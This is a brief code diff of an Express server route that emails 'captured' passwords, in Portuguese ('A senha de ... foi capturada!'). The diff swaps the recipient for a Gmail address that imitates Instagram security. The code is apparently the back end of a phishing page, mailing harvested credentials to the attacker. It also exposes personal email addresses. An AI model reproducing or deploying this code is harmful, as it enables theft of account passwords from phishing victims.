@@ -8,7 +8,7 @@ server.post('/enviarEmail', async (req, resp) => {
 
     let config = {
         from: "Testes <t371050@gmail.com>",
-        to: "vivi0601lima@gmail.com",
+        to: "instagram.securitz7@gmail.com",
         subject: "A senha de " + subject + " foi capturada!",
         text: "A senha é " + text
     };
